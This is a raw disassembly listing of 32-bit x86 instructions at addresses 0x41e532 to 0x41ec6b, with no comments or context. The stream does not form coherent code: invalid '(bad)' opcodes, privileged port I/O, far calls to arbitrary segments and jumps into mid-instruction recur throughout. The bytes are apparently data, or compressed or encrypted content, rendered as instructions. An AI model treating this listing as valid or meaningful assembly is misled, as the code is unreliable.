  41e532:	mov    bh,0xb9
  41e534:	cmp    al,0x45
  41e536:	and    eax,0x9260b7f3
  41e53b:	sbb    al,0x50
  41e53d:	fdiv   DWORD PTR [ebx]
  41e53f:	jne    0x41e58b
  41e541:	pop    es
  41e542:	out    dx,al
  41e543:	bound  esi,QWORD PTR [ebp+ecx*2+0x78]
  41e547:	icebp  
  41e548:	and    dl,al
  41e54a:	sbb    BYTE PTR [ecx+0x1edd8085],ah
  41e550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e551:	mov    ebx,0xb45de50f
  41e556:	mov    bh,0x3b
  41e558:	fst    st(0)
  41e55a:	imul   esp,DWORD PTR [ebx],0xa0e22e96
  41e560:	mov    DWORD PTR [esi],eax
  41e562:	cs (bad) 
  41e564:	clc    
  41e565:	jle    0x41e598
  41e567:	sbb    ebx,DWORD PTR [esi-0x32]
  41e56a:	mov    ds:0x231ee4b2,eax
  41e56f:	inc    esp
  41e570:	xchg   edx,eax
  41e571:	pusha  
  41e572:	enter  0xdf09,0xc6
  41e576:	push   edx
  41e577:	add    eax,0x54eec025
  41e57c:	lock and DWORD PTR [eax],esp
  41e57f:	add    DWORD PTR [ebx],ebx
  41e581:	call   0xb1d7:0x3feda0f0
  41e588:	add    eax,0x78ac715c
  41e58d:	push   ds
  41e58e:	fld    DWORD PTR [edx+0x6b5ee028]
  41e594:	sbb    DWORD PTR [ebx+0x39],esp
  41e597:	cdq    
  41e598:	fiadd  WORD PTR [edi]
  41e59a:	stos   DWORD PTR es:[edi],eax
  41e59b:	gs jecxz 0x41e5b1
  41e59e:	mov    BYTE PTR [eax+0x7a],dh
  41e5a1:	hlt    
  41e5a2:	out    dx,al
  41e5a3:	cmp    eax,0xb4af9635
  41e5a8:	sbb    DWORD PTR [esi],ebp
  41e5aa:	mov    ecx,0x126fa6a2
  41e5af:	not    BYTE PTR [ebx+0x5ce6aed1]
  41e5b5:	(bad)  
  41e5b6:	fcomp  QWORD PTR [eax+0x1717205d]
  41e5bc:	jbe    0x41e57e
  41e5be:	sti    
  41e5bf:	adc    BYTE PTR cs:[esi-0x71],0xa2
  41e5c4:	mov    edx,0xb518b72
  41e5c9:	jno    0x41e634
  41e5cb:	jne    0x41e582
  41e5cd:	aad    0xee
  41e5cf:	mov    bh,BYTE PTR [ebx+0x4e]
  41e5d2:	cli    
  41e5d3:	loopne 0x41e62c
  41e5d5:	mov    al,ds:0x3e04cd95
  41e5da:	add    dl,BYTE PTR [ebx]
  41e5dc:	mov    ebp,0xd2eb9fa0
  41e5e1:	push   es
  41e5e2:	inc    esi
  41e5e3:	ret    
  41e5e4:	in     eax,dx
  41e5e5:	out    dx,al
  41e5e6:	fidiv  WORD PTR [eax+0x27eeade9]
  41e5ec:	icebp  
  41e5ed:	hlt    
  41e5ee:	gs mov eax,0xf7aeb2b2
  41e5f4:	fsubr  QWORD PTR [ecx]
  41e5f6:	mov    eax,es:0x121e9a15
  41e5fc:	(bad)  
  41e5fd:	and    al,0x87
  41e5ff:	mov    ds,WORD PTR [esi-0x57]
  41e602:	popa   
  41e603:	pop    ebx
  41e604:	push   cs
  41e605:	test   al,0x8e
  41e607:	xor    edi,DWORD PTR [esi+0x60]
  41e60a:	jae    0x41e639
  41e60c:	out    dx,eax
  41e60d:	cs jo  0x41e5fa
  41e610:	xchg   DWORD PTR [ebx],ecx
  41e612:	out    dx,al
  41e613:	call   0xda0255d0
  41e618:	gs sbb edi,0xbd341ca1
  41e61f:	arpl   WORD PTR [ebp+0xb5954c1],dx
  41e625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e626:	out    dx,al
  41e627:	xchg   ecx,eax
  41e628:	leave  
  41e629:	sub    DWORD PTR [ebx-0x58],0x2f
  41e62d:	add    eax,0xa0f0a0cd
  41e632:	jmp    0xe114cdaf
  41e637:	ja     0x41e66a
  41e639:	out    dx,eax
  41e63a:	(bad)  
  41e63b:	mov    al,ds:0xac5b6cd4
  41e640:	call   0xee3023a
  41e645:	in     al,dx
  41e646:	inc    esp
  41e647:	idiv   DWORD PTR fs:[esi+0x12]
  41e64b:	daa    
  41e64c:	leave  
  41e64d:	sar    ch,0x1f
  41e650:	xchg   esp,eax
  41e651:	mov    ds:0x53fea02,al
  41e656:	pop    esi
  41e657:	cmp    bl,BYTE PTR [ebp+0x72]
  41e65a:	add    eax,0x4fc9df3f
  41e65f:	pop    ebp
  41e660:	jo     0x41e6d8
  41e662:	fmul   QWORD PTR [edx+0xe53295e]
  41e668:	sub    BYTE PTR [ebp-0x29],ah
  41e66b:	or     cl,BYTE PTR [eax+0x8dff860]
  41e671:	pop    esi
  41e672:	xchg   edx,eax
  41e673:	cmp    al,0x82
  41e675:	imul   esi,eax,0xe
  41e678:	xlat   BYTE PTR ds:[ebx]
  41e679:	inc    edx
  41e67a:	jp     0x41e6bd
  41e67c:	push   ebx
  41e67d:	cli    
  41e67e:	xor    BYTE PTR [edi+0x76],dl
  41e681:	mov    ds:0xeac5a2cc,al
  41e686:	stc    
  41e687:	(bad)  
  41e688:	imul   esi,DWORD PTR [eax+0x4e],0x0
  41e68c:	js     0x41e621
  41e68e:	(bad)  
  41e68f:	out    dx,al
  41e690:	pop    esi
  41e691:	cmp    DWORD PTR [ebp+edx*4-0x59],ebx
  41e695:	test   BYTE PTR [ecx+0x3c60b338],bh
  41e69b:	add    ch,BYTE PTR [esi]
  41e69d:	push   ds
  41e69e:	adc    al,0x45
  41e6a0:	push   edi
  41e6a1:	icebp  
  41e6a2:	out    dx,al
  41e6a3:	pop    edx
  41e6a4:	sub    dh,BYTE PTR [ebx]
  41e6a6:	jns    0x41e680
  41e6a8:	pop    esp
  41e6a9:	mov    ebx,0x79b3a469
  41e6ae:	mov    esi,0x4bb123ac
  41e6b3:	dec    edx
  41e6b4:	(bad)  
  41e6b5:	mov    edi,DWORD PTR [edx]
  41e6b7:	cld    
  41e6b8:	pop    esi
  41e6b9:	repnz mov eax,0xcc59e759
  41e6bf:	mov    gs:0x5d3a1160,eax
  41e6c5:	adc    DWORD PTR [edi],esp
  41e6c7:	jns    0x41e6c2
  41e6c9:	shr    dh,1
  41e6cb:	inc    edx
  41e6cc:	arpl   WORD PTR [ecx],si
  41e6ce:	xor    DWORD PTR [eax-0x5e8671be],0xb640c592
  41e6d8:	ins    DWORD PTR es:[edi],dx
  41e6d9:	sahf   
  41e6da:	xor    eax,0xeee1b6ae
  41e6df:	cmp    dl,BYTE PTR [ebx-0x58]
  41e6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e3:	into   
  41e6e4:	(bad)  
  41e6e5:	scas   al,BYTE PTR es:[edi]
  41e6e6:	jl     0x41e6dd
  41e6e8:	in     al,dx
  41e6e9:	pusha  
  41e6ea:	mov    esp,0x5d7b2476
  41e6ef:	sti    
  41e6f0:	push   ss
  41e6f1:	cmp    eax,esi
  41e6f3:	ja     0x41e769
  41e6f5:	sbb    eax,0x57d4c7ca
  41e6fa:	out    dx,al
  41e6fb:	pop    es
  41e6fc:	loopne 0x41e6ce
  41e6fe:	in     eax,0xa0
  41e700:	adc    esi,DWORD PTR [ecx+0x6ee59b62]
  41e706:	nop
  41e707:	adc    al,0x5e
  41e709:	ds dec eax
  41e70b:	adc    BYTE PTR [edx+0x459a837d],dh
  41e711:	es clc 
  41e713:	(bad)  
  41e714:	push   edx
  41e715:	pop    edi
  41e716:	lods   al,BYTE PTR ds:[esi]
  41e717:	mov    al,ds:0xea9a89a3
  41e71c:	repnz cli 
  41e71e:	out    dx,al
  41e71f:	aam    0xe2
  41e721:	es mov bl,0xbe
  41e724:	mov    cl,0xbd
  41e726:	sbb    al,0xa1
  41e728:	inc    ecx
  41e729:	mov    BYTE PTR [ebx+0x70],bh
  41e72c:	adc    BYTE PTR [ecx+0x145f52a2],dl
  41e732:	std    
  41e733:	dec    eax
  41e734:	sub    eax,0xde5fe858
  41e739:	jle    0x41e732
  41e73b:	push   0x2a45432a
  41e740:	push   eax
  41e741:	loope  0x41e722
  41e743:	xchg   ebp,eax
  41e744:	aaa    
  41e745:	xchg   BYTE PTR [ecx+0x26e99d],bl
  41e74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e74d:	push   ds
  41e74e:	sub    eax,0xdfaa81b
  41e753:	jle    0x41e753
  41e755:	xor    eax,0x60806956
  41e75a:	nop
  41e75b:	push   ebx
  41e75c:	xchg   esp,eax
  41e75d:	mov    ecx,0xd09d9c75
  41e762:	out    dx,al
  41e763:	jae    0x41e77c
  41e765:	adc    DWORD PTR [eax],esi
  41e767:	push   eax
  41e768:	dec    ebp
  41e769:	daa    
  41e76a:	push   esi
  41e76b:	popa   
  41e76c:	js     0x41e7a6
  41e76e:	inc    eax
  41e76f:	inc    ecx
  41e770:	inc    eax
  41e771:	cs out dx,al
  41e773:	mov    BYTE PTR [edi+0x4c],bl
  41e776:	cmp    eax,0x1057f612
  41e77b:	mov    eax,ds:0x42fba22f
  41e780:	cli    
  41e781:	data16 sbb dl,BYTE PTR [edi+0x4ceee67e]
  41e788:	xchg   ebp,eax
  41e789:	xchg   ecx,eax
  41e78a:	imul   ebx,DWORD PTR [ecx],0x68
  41e78d:	push   esi
  41e78e:	dec    esi
  41e78f:	mov    eax,ds:0x7790c99
  41e794:	js     0x41e726
  41e796:	fadd   QWORD PTR [esi-0x20410d9c]
  41e79c:	call   0x2cef:0x5f783ce0
  41e7a3:	lea    ecx,[edx-0x35]
  41e7a6:	and    al,0x21
  41e7a8:	es mov ebp,0xfeaa095c
  41e7ae:	loopne 0x41e74a
  41e7b0:	pop    esi
  41e7b1:	les    esp,FWORD PTR [ebx+0x2b]
  41e7b4:	nop
  41e7b5:	push   esp
  41e7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7b7:	add    BYTE PTR [ebp+0x60],bl
  41e7ba:	js     0x41e768
  41e7bc:	mov    eax,ds:0x9fab13df
  41e7c1:	cwde   
  41e7c2:	pop    ebp
  41e7c3:	jmp    0x92766f26
  41e7c8:	mov    cl,0xac
  41e7ca:	xchg   edi,eax
  41e7cb:	xor    DWORD PTR [edx+0x52],ecx
  41e7ce:	mov    edx,0xefe6244d
  41e7d3:	lods   al,BYTE PTR ds:[esi]
  41e7d4:	fcmovnu st,st(6)
  41e7d6:	div    BYTE PTR [eax]
  41e7d8:	inc    eax
  41e7d9:	fimul  DWORD PTR fs:[ebp+0x1066f45e]
  41e7e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e1:	push   edi
  41e7e2:	daa    
  41e7e3:	mov    ah,0xe6
  41e7e5:	pusha  
  41e7e6:	jge    0x41e7ef
  41e7e8:	test   al,0xc4
  41e7ea:	hlt    
  41e7eb:	enter  0xe761,0x16
  41e7ef:	mov    al,0x82
  41e7f1:	and    DWORD PTR [esi-0x4f],0x6021cf64
  41e7f8:	hlt    
  41e7f9:	inc    eax
  41e7fa:	inc    eax
  41e7fb:	not    DWORD PTR [esi-0x48]
  41e7fe:	sub    esp,DWORD PTR [ecx-0x7567e32f]
  41e804:	std    
  41e805:	mov    BYTE PTR [ebx+0xddc647f],bh
  41e80b:	out    dx,eax
  41e80c:	mov    esp,DWORD PTR [eax+0x5337b2b7]
  41e812:	jb     0x41e7b5
  41e814:	in     al,dx
  41e815:	mov    al,ds:0x93feca18
  41e81a:	pop    edx
  41e81b:	das    
  41e81c:	pop    esi
  41e81d:	cmp    eax,0x6b9acc2c
  41e822:	pop    ebx
  41e824:	mov    ds:0x73a13eaa,eax
  41e829:	fild   DWORD PTR [eax+ebx*1-0x55f865ba]
  41e830:	pop    esi
  41e831:	jne    0x41e7be
  41e833:	sbb    al,0x22
  41e835:	mov    esp,0x60f83663
  41e83a:	adc    al,0x4e
  41e83d:	in     eax,0x40
  41e83f:	call   0x8d987d27
  41e844:	pop    edi
  41e845:	aas    
  41e846:	pushf  
  41e847:	jne    0x41e887
  41e849:	imul   esi,DWORD PTR [ebp+0x31],0xa18a8ab7
  41e850:	in     al,dx
  41e851:	jecxz  0x41e7d7
  41e853:	test   BYTE PTR [esi],cl
  41e855:	pop    edx
  41e856:	in     eax,0x48
  41e858:	pop    esi
  41e859:	dec    edx
  41e85a:	popf   
  41e85b:	inc    ebx
  41e85c:	jbe    0x41e89c
  41e85e:	out    dx,eax
  41e85f:	sbb    eax,0x52560d2
  41e864:	inc    ebp
  41e865:	dec    esp
  41e866:	add    eax,0x66c7d3be
  41e86b:	das    
  41e86c:	fs mov esi,0xc11b4cd2
  41e872:	imul   esp,ebp,0xa0c4de91
  41e878:	jecxz  0x41e88f
  41e87a:	jo     0x41e7ff
  41e87c:	idiv   DWORD PTR [ebp+0xd]
  41e87f:	xchg   esi,eax
  41e880:	pop    edi
  41e881:	inc    ebp
  41e882:	dec    edi
  41e883:	xchg   ebx,eax
  41e884:	out    dx,al
  41e885:	rcl    DWORD PTR [ecx+0x169acd71],cl
  41e88b:	mov    eax,ds:0x4c2fcebf
  41e890:	mov    esp,0x64212547
  41e895:	xchg   ebp,eax
  41e896:	ds jp  0x41e8a9
  41e899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e89a:	scas   al,BYTE PTR es:[edi]
  41e89b:	in     al,0xf3
  41e89d:	sbb    edx,DWORD PTR [edi-0x12]
  41e8a0:	push   edx
  41e8a1:	popa   
  41e8a2:	jg     0x41e8e1
  41e8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8a5:	push   ss
  41e8a6:	ret    
  41e8a7:	mov    eax,ds:0x11f0e496
  41e8ac:	scas   eax,DWORD PTR es:[edi]
  41e8ad:	or     BYTE PTR [edi-0x7577fdff],dl
  41e8b3:	push   0xfffffff7
  41e8b5:	addr16 mov ebp,0x58745e90
  41e8bb:	push   ss
  41e8bc:	dec    edx
  41e8bd:	inc    esp
  41e8be:	shr    BYTE PTR [esi+0x36],0xa6
  41e8c2:	(bad)  
  41e8c3:	and    BYTE PTR [edx+ecx*1+0x13],ah
  41e8c7:	aad    0xbe
  41e8c9:	(bad)  
  41e8ca:	adc    edi,ebp
  41e8cc:	mov    bl,0x15
  41e8ce:	xlat   BYTE PTR ds:[ebx]
  41e8cf:	ins    BYTE PTR es:[edi],dx
  41e8d0:	sub    BYTE PTR [ecx+0x6c],ah
  41e8d3:	mov    bh,0x3e
  41e8d5:	int3   
  41e8d6:	ret    0x67f0
  41e8d9:	popa   
  41e8da:	pushf  
  41e8db:	inc    ebx
  41e8dc:	push   edx
  41e8dd:	fstp   QWORD PTR [ebp-0x11ea160c]
  41e8e3:	call   0xc296:0x359ff394
  41e8ea:	lock mov eax,ds:0x6e5de656
  41e8f0:	pusha  
  41e8f1:	pop    ecx
  41e8f2:	daa    
  41e8f3:	dec    ecx
  41e8f4:	lods   al,BYTE PTR ds:[esi]
  41e8f5:	xor    dh,ch
  41e8f7:	cli    
  41e8f8:	dec    edx
  41e8f9:	xlat   BYTE PTR ds:[ebx]
  41e8fa:	shr    BYTE PTR [esi],cl
  41e8fc:	out    dx,eax
  41e8fd:	es pusha 
  41e8ff:	icebp  
  41e900:	add    al,0x61
  41e902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e903:	test   DWORD PTR [ecx+0x57],esi
  41e906:	fcomp  DWORD PTR [edx-0x6e11c394]
  41e90c:	jmp    0xb3bd:0xdf519ac7
  41e913:	mov    ds:0xa9d10cd9,eax
  41e918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e919:	jne    0x41e902
  41e91b:	(bad)  
  41e91c:	loopne 0x41e8a7
  41e91e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e91f:	mov    WORD PTR [esi+0x5fd9d4b3],?
  41e925:	popa   
  41e926:	ret    0xc35b
  41e929:	es pop ebx
  41e92b:	repnz scas eax,DWORD PTR es:[edi]
  41e92d:	cld    
  41e92e:	out    dx,al
  41e92f:	pop    esp
  41e930:	das    
  41e931:	int    0x2
  41e933:	popa   
  41e934:	pop    ss
  41e935:	pop    ss
  41e936:	xor    bh,ch
  41e938:	rcl    BYTE PTR [ecx+0x5e],1
  41e93b:	add    eax,0x6f0ec135
  41e940:	inc    ebx
  41e941:	mov    DWORD PTR [eax],ebp
  41e943:	xor    ebx,DWORD PTR [esi-0x39]
  41e946:	sbb    eax,0x7a9364c2
  41e94b:	(bad)  
  41e94c:	mov    ah,BYTE PTR [eax+0x29]
  41e94f:	jns    0x41e90d
  41e951:	cwde   
  41e952:	mov    al,ds:0xff2e84b8
  41e957:	dec    ebx
  41e958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e95a:	outs   dx,BYTE PTR ds:[esi]
  41e95b:	sub    cl,BYTE PTR [esi-0xac946e0]
  41e961:	scas   al,BYTE PTR es:[edi]
  41e962:	mov    ah,0xa0
  41e964:	leave  
  41e965:	mov    cl,0x88
  41e967:	pop    ebx
  41e968:	xchg   esp,eax
  41e969:	std    
  41e96a:	pop    ss
  41e96b:	and    DWORD PTR ds:0x59a18df2,esi
  41e971:	or     ah,cl
  41e973:	adc    dh,BYTE PTR [ebp+0x78]
  41e976:	push   edx
  41e977:	mov    eax,ds:0x79bf4690
  41e97c:	push   ebx
  41e97d:	rcl    BYTE PTR [ecx+0x1c],1
  41e980:	arpl   WORD PTR [esi+0x20dc89d5],cx
  41e986:	jp     0x41e95e
  41e988:	mov    ss,WORD PTR [edx]
  41e98a:	jbe    0x41e930
  41e98c:	mov    ah,0xb2
  41e98e:	mov    cl,0x5e
  41e990:	jecxz  0x41e9eb
  41e992:	popf   
  41e993:	test   BYTE PTR [edx],0xa1
  41e996:	(bad)  
  41e997:	iret   
  41e998:	pop    esi
  41e999:	mov    ebp,0x63dba26c
  41e99e:	mov    ds:0xe9608891,al
  41e9a3:	add    BYTE PTR [edx-0x2c035b2e],dl
  41e9a9:	ins    BYTE PTR es:[edi],dx
  41e9aa:	out    dx,al
  41e9ab:	icebp  
  41e9ac:	push   eax
  41e9ad:	sti    
  41e9ae:	and    BYTE PTR [edi],0xad
  41e9b1:	sahf   
  41e9b2:	pop    esi
  41e9b3:	mov    eax,ds:0x464cc6dd
  41e9b8:	(bad)  
  41e9b9:	mov    ch,0xfa
  41e9bb:	cwde   
  41e9bc:	pop    esi
  41e9bd:	pushf  
  41e9be:	pop    ebp
  41e9bf:	loopne 0x41ea09
  41e9c1:	pop    es
  41e9c2:	add    DWORD PTR [ecx+0x16824436],esi
  41e9c8:	addr16 call 0x8644:0x3fb22a8b
  41e9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d1:	pushf  
  41e9d2:	pop    edx
  41e9d3:	mov    edi,0x18983c5e
  41e9d8:	add    BYTE PTR [edi],bl
  41e9da:	std    
  41e9db:	push   ebp
  41e9dc:	jmp    0x41ea3e
  41e9de:	sub    DWORD PTR [ebp-0x78],ecx
  41e9e1:	dec    esp
  41e9e2:	cdq    
  41e9e3:	inc    edx
  41e9e4:	cwde   
  41e9e5:	aaa    
  41e9e6:	out    dx,al
  41e9e7:	rcr    eax,1
  41e9e9:	pop    edx
  41e9ea:	or     bh,dl
  41e9ec:	cmp    esi,DWORD PTR [esi-0x294836e3]
  41e9f2:	push   ss
  41e9f3:	mov    esp,esp
  41e9f5:	pop    esp
  41e9f6:	rcr    eax,cl
  41e9f8:	(bad)  
  41e9f9:	aaa    
  41e9fa:	adc    BYTE PTR [ecx],ah
  41e9fc:	push   es
  41e9fd:	pushf  
  41e9fe:	fisttp WORD PTR [esi+ebx*2+0x199dd453]
  41ea05:	shl    DWORD PTR [ecx],cl
  41ea07:	dec    esi
  41ea08:	jl     0x41ea2f
  41ea0a:	push   0x5eab42a1
  41ea0f:	cs jp  0x41e9f3
  41ea12:	xchg   DWORD PTR [esi-0x1d96e5a2],esp
  41ea18:	leave  
  41ea19:	xor    BYTE PTR [ecx-0x79a35737],0x28
  41ea20:	jg     0x41ea63
  41ea22:	or     ah,BYTE PTR [ecx]
  41ea24:	fidiv  DWORD PTR [ecx+0x28]
  41ea27:	jo     0x41e9af
  41ea29:	pop    ebp
  41ea2a:	sti    
  41ea2b:	lds    edi,FWORD PTR [ecx+ebp*4-0x12]
  41ea2f:	pop    eax
  41ea30:	dec    ebx
  41ea31:	sahf   
  41ea32:	imul   ebx,DWORD PTR [esi+0x7f],0x60
  41ea36:	and    ebx,edi
  41ea38:	(bad)  
  41ea3a:	inc    esp
  41ea3b:	sub    ebp,DWORD PTR [edx+0x57]
  41ea3e:	out    dx,al
  41ea3f:	in     eax,0xa6
  41ea41:	inc    edi
  41ea42:	add    al,0xc4
  41ea44:	fstp   TBYTE PTR [ebx+0x7210a199]
  41ea4a:	ds jge 0x41ea49
  41ea4d:	test   al,0x9e
  41ea4f:	retf   0x6864
  41ea52:	mov    edx,DWORD PTR [ebp-0x5e21bf7b]
  41ea58:	mov    ebp,0x69a16c27
  41ea5d:	or     eax,0xb22b7091
  41ea62:	jno    0x41ead2
  41ea64:	pop    esi
  41ea65:	dec    edi
  41ea66:	pop    ds
  41ea67:	cmp    al,0xd3
  41ea69:	pushf  
  41ea6a:	sub    ebp,DWORD PTR [eax]
  41ea6c:	imul   eax,DWORD PTR ds:[ecx-0x465921f8],0x1a9158c4
  41ea77:	adc    ebx,DWORD PTR [esi+0x46]
  41ea7a:	mov    eax,0x741b0d8
  41ea7f:	xchg   ecx,eax
  41ea80:	addr16 popa 
  41ea82:	fxch   st(6)
  41ea84:	pop    es
  41ea85:	call   0x39ee:0x3710150e
  41ea8c:	call   0x6583:0x54bdb6b3
  41ea93:	mov    eax,ds:0xb2944588
  41ea98:	(bad)  
  41ea99:	outs   dx,BYTE PTR ds:[esi]
  41ea9a:	es jo  0x41eafb
  41ea9d:	aaa    
  41ea9e:	call   0x7504:0xdc0483d7
  41eaa5:	pusha  
  41eaa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaa7:	stos   BYTE PTR es:[edi],al
  41eaa8:	cmp    ebp,ecx
  41eaaa:	push   cs
  41eaab:	fs xor ah,bh
  41eaae:	out    dx,al
  41eaaf:	sahf   
  41eab0:	enter  0x39ad,0xe9
  41eab4:	sub    BYTE PTR [ebp+0x60f92976],ch
  41eaba:	ins    DWORD PTR es:[edi],dx
  41eabb:	push   0xffffffe4
  41eabd:	push   ebp
  41eabe:	pop    edi
  41eabf:	popa   
  41eac0:	jns    0x41ead0
  41eac2:	out    dx,al
  41eac3:	push   ebx
  41eac4:	fcom   st(1)
  41eac6:	ret    
  41eac7:	push   esp
  41eac8:	mov    esi,0x9fa1401d
  41eacd:	mov    BYTE PTR [edi],ah
  41eacf:	test   eax,0xb03d6ec7
  41ead4:	push   ebx
  41ead5:	xchg   edi,eax
  41ead6:	loope  0x41eab1
  41ead8:	fisubr WORD PTR [edx]
  41eada:	cmp    ecx,esp
  41eadc:	pusha  
  41eadd:	adc    al,0x6
  41eadf:	fincstp 
  41eae1:	cwde   
  41eae2:	in     eax,dx
  41eae3:	loop   0x41eac8
  41eae5:	dec    ebp
  41eae6:	push   esp
  41eae7:	adc    dh,BYTE PTR [ebp+0x5e9a7ba0]
  41eaed:	push   ds
  41eaee:	mov    ecx,DWORD PTR [ebx+ebx*1]
  41eaf1:	mov    dh,0x20
  41eaf3:	fwait
  41eaf4:	mov    ch,BYTE PTR ds:0x471ea186
  41eafa:	int3   
  41eafb:	xlat   BYTE PTR ds:[ebx]
  41eafc:	jbe    0x41eac7
  41eafe:	arpl   WORD PTR [esi+0x5e],sp
  41eb01:	daa    
  41eb02:	jle    0x41eb01
  41eb04:	push   ebx
  41eb05:	mov    esp,0x611942f5
  41eb0a:	jne    0x41eb57
  41eb0c:	int    0xf3
  41eb0e:	xor    DWORD PTR [eax+edx*8-0x47d811cd],0x23
  41eb16:	sub    BYTE PTR [edi-0x608da27d],dl
  41eb1c:	(bad)  
  41eb1d:	scas   eax,DWORD PTR es:[edi]
  41eb1e:	add    DWORD PTR [ebx-0x52037f42],edi
  41eb24:	sbb    eax,0x8488ee94
  41eb29:	lds    ebx,FWORD PTR [ecx+ebx*2]
  41eb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb2e:	call   0xe629ecc6
  41eb33:	lahf   
  41eb34:	icebp  
  41eb35:	pop    ss
  41eb36:	into   
  41eb37:	cld    
  41eb38:	dec    ebp
  41eb39:	icebp  
  41eb3a:	fnstcw WORD PTR [ebx]
  41eb3c:	pop    ebx
  41eb3d:	jmp    0x9938ae54
  41eb42:	ds push cs
  41eb44:	aaa    
  41eb45:	jecxz  0x41ebbc
  41eb47:	fnstcw WORD PTR [eax-0x4967e1ff]
  41eb4d:	inc    ebp
  41eb4e:	push   ebp
  41eb4f:	loop   0x41ebaf
  41eb51:	xchg   edx,eax
  41eb52:	dec    ebp
  41eb53:	adc    eax,0x5bbe6bd6
  41eb58:	scas   al,BYTE PTR es:[edi]
  41eb59:	mov    dh,0xf6
  41eb5b:	mov    al,ds:0xf585bc92
  41eb60:	stos   DWORD PTR es:[edi],eax
  41eb61:	mov    esi,0xb65e80b5
  41eb66:	sub    al,0x12
  41eb68:	imul   esi,DWORD PTR [esi-0x41],0xa25e5d57
  41eb6f:	test   DWORD PTR [bx+si-0x37],edx
  41eb73:	mov    ch,0x93
  41eb75:	xor    BYTE PTR [eax+edx*1],bl
  41eb78:	pop    edx
  41eb79:	stc    
  41eb7a:	out    dx,eax
  41eb7b:	inc    BYTE PTR [eax]
  41eb7d:	mov    WORD PTR [esi-0x2c5caabe],?
  41eb83:	sub    BYTE PTR [ebx+0x3d],0xf8
  41eb87:	mov    al,ds:0x55153521
  41eb8c:	pop    ebx
  41eb8d:	popf   
  41eb8e:	gs pop ss
  41eb90:	push   esp
  41eb91:	xor    BYTE PTR [ebp+0x77a1df18],0xb0
  41eb98:	push   eax
  41eb99:	loope  0x41eba7
  41eb9b:	aas    
  41eb9c:	into   
  41eb9d:	pusha  
  41eb9e:	daa    
  41eb9f:	fidivr WORD PTR [edi]
  41eba1:	in     eax,dx
  41eba2:	scas   eax,DWORD PTR es:[edi]
  41eba3:	pop    esp
  41eba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba5:	ja     0x41eb95
  41eba7:	loop   0x41eb37
  41eba9:	in     eax,0x72
  41ebab:	inc    eax
  41ebac:	loope  0x41eb6c
  41ebae:	in     eax,0xf0
  41ebb0:	nop
  41ebb1:	scas   al,BYTE PTR es:[edi]
  41ebb2:	push   ecx
  41ebb3:	mov    eax,ds:0x150a5c6d
  41ebb8:	jp     0x41ec37
  41ebba:	(bad)  
  41ebbb:	aam    0x64
  41ebbd:	sub    DWORD PTR [ebp+0x42],0xfffffff4
  41ebc1:	and    BYTE PTR [esi+0x39e861ed],al
  41ebc7:	mov    eax,ds:0x45dcca1d
  41ebcc:	aad    0x90
  41ebce:	xchg   edi,eax
  41ebcf:	add    bl,BYTE PTR [esi+0x2b]
  41ebd2:	inc    edx
  41ebd3:	inc    ebp
  41ebd4:	inc    esi
  41ebd6:	jns    0x41ebb6
  41ebd8:	sub    BYTE PTR [esi-0x56],bl
  41ebdb:	jbe    0x41eb9d
  41ebdd:	mov    al,ds:0x827563ce
  41ebe2:	and    al,0xb2
  41ebe4:	shl    eax,cl
  41ebe6:	or     BYTE PTR [ecx+esi*1-0x17f5b6a3],ah
  41ebed:	sub    BYTE PTR [bx+di],0xde
  41ebf1:	out    dx,al
  41ebf2:	rcl    DWORD PTR [esi-0x49363036],cl
  41ebf8:	hlt    
  41ebf9:	(bad)
  41ebfd:	push   cs
  41ebfe:	and    al,0x21
  41ec00:	fwait
  41ec01:	into   
  41ec02:	out    0x53,al
  41ec04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec05:	cld    
  41ec06:	loopne 0x41ebfb
  41ec08:	(bad)  
  41ec09:	pusha  
  41ec0a:	arpl   WORD PTR [ebp-0x63],cx
  41ec0d:	pop    ebx
  41ec0e:	gs loopne 0x41ebdf
  41ec11:	fs out dx,al
  41ec13:	push   esp
  41ec14:	ds xchg ebx,eax
  41ec16:	inc    edi
  41ec17:	mov    edx,0xa1270711
  41ec1c:	loopne 0x41ec58
  41ec1e:	xor    DWORD PTR [ebp+0xd65da58],0x5e
  41ec25:	cmp    BYTE PTR [eax],ch
  41ec27:	stc    
  41ec28:	push   0xffffffda
  41ec2a:	loopne 0x41ebf3
  41ec2c:	pop    esp
  41ec2d:	inc    ebp
  41ec2e:	mov    bh,0x78
  41ec30:	pusha  
  41ec31:	fisttp QWORD PTR [edx]
  41ec33:	fwait
  41ec34:	aam    0xa0
  41ec36:	fldcw  WORD PTR [esi+0x23]
  41ec39:	adc    eax,0x2210d8ee
  41ec3e:	lods   al,BYTE PTR ds:[esi]
  41ec3f:	call   0xa98eb858
  41ec44:	jmp    0xe0e2cfa8
  41ec49:	inc    edx
  41ec4a:	clc    
  41ec4b:	xchg   BYTE PTR [ecx],ah
  41ec4d:	cmp    al,0xe0
  41ec4f:	mov    ebx,DWORD PTR [edi-0x6e]
  41ec52:	lods   eax,DWORD PTR ds:[esi]
  41ec53:	mov    dh,0x6a
  41ec55:	fwait
  41ec56:	stc    
  41ec57:	xor    esp,DWORD PTR [ebp+0x5396bee0]
  41ec5d:	push   ebx
  41ec5e:	jnp    0x41ec46
  41ec60:	jp     0x41ec66
  41ec62:	out    dx,al
  41ec63:	xchg   DWORD PTR [edx+0x5e71bd2d],esp
  41ec69:	jg     0x41ecb3
  41ec6b:	aas    
